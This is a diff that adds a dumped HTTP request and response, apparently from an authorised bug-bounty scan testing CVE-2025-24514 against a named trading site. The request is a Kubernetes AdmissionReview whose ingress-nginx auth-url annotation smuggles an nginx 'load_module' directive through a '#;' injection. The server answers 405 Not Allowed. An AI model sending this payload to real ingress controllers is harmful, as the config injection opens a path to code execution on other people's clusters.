@@ -1,0 +1,111 @@
+[CVE-2025-24514] Dumped HTTP request for https://advanced.bitpanda.com
+
+
+POST / HTTP/1.1
+Host: advanced.bitpanda.com
+User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 1572
+Content-Type: application/json
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+{
+  "kind": "AdmissionReview",
+  "apiVersion": "admission.k8s.io/v1",
+  "request": {
+    "uid": "d48aa397-c414-4fb2-a2b0-b28187daf8a6",
+    "kind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "resource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "requestKind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "requestResource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "name": "test-30rudgSkBEprwelkMBpyjrr40jt",
+    "namespace": "default",
+    "operation": "CREATE",
+    "userInfo": {
+
+    },
+    "object": {
+      "kind": "Ingress",
+      "apiVersion": "networking.k8s.io/v1",
+      "metadata": {
+        "name": "test-30rudgSkBEprwelkMBpyjrr40jt",
+        "namespace": "default",
+        "creationTimestamp": null,
+        "annotations": {
+"nginx.ingress.kubernetes.io/auth-url": "http://example.com#;load_module test;\n"
+        }
+      },
+      "spec": {
+        "ingressClassName": "nginx",
+        "rules": [
+          {
+            "host": "30rudgSkBEprwelkMBpyjrr40jt",
+            "http": {
+              "paths": [
+              ]
+            }
+          }
+        ]
+      },
+      "status": {
+        "loadBalancer": {}
+      }
+    },
+    "oldObject": null,
+    "dryRun": true,
+    "options": {
+      "kind": "CreateOptions",
+      "apiVersion": "meta.k8s.io/v1"
+    }
+  }
+}
+[CVE-2025-24514] Dumped HTTP response https://advanced.bitpanda.com
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 559
+Alt-Svc: clear
+Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+Content-Security-Policy: default-src 'self'; base-uri 'self'; script-src 'self' 'unsafe-inline' https: *.talos.com sentry.io widget.intercom.io js.intercomcdn.com; style-src 'self' 'unsafe-inline' https: fonts.googleapis.com; style-src-elem 'self' 'unsafe-inline' https: fonts.googleapis.com; img-src 'self' data: storage.googleapis.com blob: advanced.bitpanda.com fusion.bitpanda.com fusion.institutional.bitpanda.com cdnjs.cloudflare.com/ajax/libs/twemoji/; font-src 'self' data: fonts.googleapis.com fonts.gstatic.com; frame-src 'self' blob: *.talostrading.com *.talos.com advanced.bitpanda.com fusion.bitpanda.com fusion.institutional.bitpanda.com; worker-src 'self' blob:; connect-src wss: sentry.io *.sentry.io *.datadoghq.com browser-intake-datadoghq.com *.browser-intake-datadoghq.com *.intercom.io *.mixpanel.com cdnjs.cloudflare.com/ajax/libs/twemoji/ advanced.bitpanda.com fusion.bitpanda.com fusion.institutional.bitpanda.com
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:50:39 GMT
+Expires: 0
+Pragma: no-cache
+Server: nginx/1.29.0
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 google
+X-Cache: uncacheable
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+
+<html>
+<head><title>405 Not Allowed</title></head>
+<body>
+<center><h1>405 Not Allowed</h1></center>
+<hr><center>nginx/1.29.0</center>
+</body>
+</html>
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+<!-- a padding to disable MSIE and Chrome friendly error page -->
+
